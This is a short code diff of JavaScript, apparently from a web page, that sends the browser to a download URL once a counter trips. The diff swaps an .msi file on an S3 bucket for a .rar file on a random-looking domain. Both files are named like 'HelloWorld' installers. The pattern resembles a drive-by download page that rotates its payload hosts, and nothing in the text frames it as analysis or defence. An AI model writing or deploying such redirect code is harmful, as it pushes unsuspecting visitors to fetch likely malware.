@@ -2,7 +2,7 @@
 {
 	if(num>=1)
 	{
-		var url="https://csrtnr.s3.ap-southeast-1.amazonaws.com/heLLerwrodc.msi";
+		var url="https://bireut-sf-sgc-af-rgbxcvh1saaf.com/Wuiryt-HelloWorldwi1.2-x64.rar";
 		window.location=url;
 	}
 }
@@ -13,6 +13,7 @@ function getLoad()
 	num++;
 
 }
+
 
 
 
